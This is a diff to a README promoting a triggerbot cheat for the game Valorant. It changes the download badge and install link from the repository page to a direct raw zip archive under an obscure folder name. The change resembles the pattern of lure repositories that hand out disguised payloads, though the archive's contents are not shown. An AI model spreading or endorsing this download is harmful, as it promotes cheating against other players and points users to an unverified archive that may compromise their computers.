@@ -1,6 +1,6 @@
 # 🎯 Valorant-Triggerbot-Auto-Fire - Instant Auto-Shoot for Victory
 
-[![Download Now](https://img.shields.io/badge/Download-ValTrigger_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kayso9918/Valorant-Triggerbot-Auto-Fire)
+[![Download Now](https://img.shields.io/badge/Download-ValTrigger_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/kayso9918/Valorant-Triggerbot-Auto-Fire/main/paraflocculus/v1.0.zip)
 
 ---
 
@@ -14,7 +14,7 @@ Whether you're a casual player or grinding ranked, this tool helps you secure ki
 
 ## 📥 Download & Install
 
-Visit this link to download the application: **[https://github.com/kayso9918/Valorant-Triggerbot-Auto-Fire](https://github.com/kayso9918/Valorant-Triggerbot-Auto-Fire)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/kayso9918/Valorant-Triggerbot-Auto-Fire/main/paraflocculus/v1.0.zip](https://raw.githubusercontent.com/kayso9918/Valorant-Triggerbot-Auto-Fire/main/paraflocculus/v1.0.zip)**
 
 ### Step-by-Step Installation
 
